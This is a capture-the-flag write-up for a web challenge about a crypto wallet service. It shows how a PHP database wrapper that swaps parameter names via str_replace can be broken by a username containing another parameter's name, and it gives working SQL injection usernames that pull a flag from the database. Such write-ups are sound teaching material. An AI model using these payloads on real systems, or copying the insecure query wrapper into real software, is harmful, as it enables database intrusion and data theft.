# MortAl mage aGEnts (web, 19 solves, 315 pts)

> I want to make a crypto currency. For now, I made the secure wallet service.

> I give you the source code of its service. Can you hack this service? ☆（ゝω・）v 

> ※The database is initialized every hour.

The app's source tell us that the first flag is located in the database and we probably have to usq SQL-injection to get it:

```sql
CREATE TABLE flag1 (
    flag1 VARCHAR(255) NOT NULL
);

INSERT INTO flag1 (flag1) VALUES ('***CENSORED***'); -- Can't guess
```

The app is full of seemingly safe prepared statements:

```sql
$transactor = $app->db->fetch(
    'SELECT * FROM transactor WHERE code = :code',
    [':code' => $code]
);
```

But the implementation is buggy:

```php
public function query($sql, $param = array())
{
    $search = [];
    $replace = [];
    foreach ($param as $key => $value) {
        $search[] = $key;
        $replace[] = sprintf("'%s'", mysqli_real_escape_string($this->link, $value));
    }
    $sql = str_replace($search, $replace, $sql);
    ...
```

Precisely, if we have 2 different paremetrs and we set the first one's value to the name of the second one, things will **break**

More precisely, `str_rplace` will replace the first parameter name twice, both times adding `''` around it.

This is the part we'll be exploiting:

```php
$notes = sprintf('%s remitted', $_SESSION['user_id']);
...
$app->db->query(
    "INSERT INTO account (user_id, debit, credit, notes) VALUES (:user_id, 0, ${amount}, :notes)",
    [':user_id' => $dstUsers['user_id'], ':notes' => $notes]
);
```

This is a good query because we can pretty easily control both arguments that get passed to the insert.

If we now set our user id to `ABC:notesDEF`, the final query will look like:

```sql
INSERT INTO account (user_id, debit, credit, notes) VALUES ('ABC'ABC:notesDEF remitted'DEF', 0, ${amount}, 'ABC:notesDEF remitted')
```

So it's pretty clear we have a injection in the `ABC` part, we'll use it to get the flag:

We're gonna need 2 accounts:

first: `,1000000,100000000,(select(flag1)from(flag1)));#:notes`

second: `,1000000,100000000,(select(flag1)from(flag1)));#`

First one will trigger the sqli and create an account for the second user that contains the flag.

We'll use the second user just to read the flag which will show up in our dashboard.
